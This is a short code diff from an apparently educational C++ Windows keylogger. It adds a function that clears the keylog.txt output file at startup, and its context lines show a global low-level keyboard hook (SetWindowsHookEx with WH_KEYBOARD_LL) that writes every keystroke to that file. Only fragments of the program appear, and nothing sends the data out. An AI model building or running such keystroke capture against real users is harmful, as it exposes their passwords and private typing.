@@ -4,13 +4,18 @@
 
 using namespace std;
 
-// Problems to be fixed: Lambda function to show when caps are on and off, Make lowercase letters show
+// Problems to be fixed: Lambda function to show when caps are on and off, Make lowercase letters show, make it clear the file everytime we run the code
+
+// Function that clears the file everytime it is ran
+void clearFile(){
+    ofstream("keylog.txt", ios::trunc);
+}
 
 
 // Function that takes an integer "key" and logs it into a file; responsible for converting the raw vkCode into readable form
 void logKeyStrokes(int key){
 
-
+    
     ofstream myFile; // File we are writing to
     myFile.open("keylog.txt", ios::app); // Opens the text file we want to add the information to, and the mode we set it is append so it adds the information after words.
 
@@ -181,7 +186,7 @@ LRESULT CALLBACK KeyboardProc (int nCode, WPARAM wPARAM, LPARAM lParam){
 
 int main(){
 
-
+    clearFile(); // Clears the file every time the program is ran
     // To take advantage of a particular type of hook, the developer provides a hook procedure (LRESULT CALLBACK KeyboardProc) and uses the SetWindowsHookEx function to install it into the chain associated with the hook.
     // So in this case we are specifying use of the WH_KEYBOARD_LL hook type
     HHOOK keyBoardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); // This is what is waiting for our keyboard strokes
